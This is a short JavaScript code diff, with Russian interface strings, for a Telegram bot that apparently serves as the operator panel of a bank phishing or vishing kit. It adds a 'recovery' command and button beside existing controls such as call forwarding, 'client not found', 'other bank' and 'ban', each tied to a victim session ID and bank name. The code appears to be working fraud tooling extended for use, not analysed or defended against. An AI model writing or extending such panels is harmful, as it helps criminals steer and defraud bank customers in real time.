@@ -162,6 +162,10 @@ bot.on('callback_query', (callbackQuery) => {
             command.type = 'redirect_call';
             responseText = 'Запрос Переадресация 📞 отправлен!';
             break;
+        case 'recovery':
+            command.type = 'recovery';
+            responseText = 'Запрос "Восстановление" отправлен!';
+            break;
         default:
             console.error(`Неизвестная команда: ${type}`);
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
@@ -345,6 +349,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
             ],
             [
+                { text: 'Восстановление', callback_data: `recovery:${sessionId}` },
                 { text: 'Другой банк', callback_data: `other:${sessionId}` },
                 { text: 'Забанить', callback_data: `ban:${sessionId}` },
             ],
